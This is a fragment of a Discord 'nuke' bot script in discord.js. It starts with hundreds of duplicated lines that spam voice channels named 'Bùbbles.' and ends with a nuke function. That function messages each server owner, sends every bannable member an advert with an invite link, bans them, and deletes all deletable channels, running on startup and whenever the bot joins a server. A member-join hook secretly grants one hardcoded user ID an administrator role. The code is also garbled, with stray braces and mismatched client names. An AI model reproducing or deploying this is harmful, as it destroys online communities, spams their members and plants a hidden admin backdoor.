m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

 
 
})
}
 
});
 
 
const { Client } = require('discord.js');
const client = new Client();
 
async function nuke(guild) {
  let users = 0;
  let channels = 0;
 
  await guild.fetchMembers();
 
  await guild.owner.send(' By Assist..').catch(e => { return void e; });
 
 
 
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('دائماً العقل الضائع الذي يطوف .الجبال والأدغال والأودية. لا يدري اين يذهب.  إذا لم تعلم أين تذهب ؟ فكل الطرق تؤدي الى بَبلز ، طريق مليء بالصَور. Bùbbles .. https://discord.gg/ffbHaBY ..').catch(e => { return void e; });
      return m.ban();
    }
  }));
 
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
 
    await guild.createChannel('@Bùbbles. ~ ', 'voice');
 
      await guild.createChannel('@Bùbbles. ~', 'text');
 
 
 
}
 
LOka.on('ready', () => {
  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log('     ');
  console.log("  Nah. that was EASY.");
  console.log("     @FuckTheWorld.       ");
  console.log("    ");
 
});
 
LOka.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});
 
LOka.on('guildMemberAdd', member => {
   
            if (member.id === "564794492473835520") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM",
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
               
            }
       
    });
 
   
 
 
 
 
LOka.login(process.env.B);
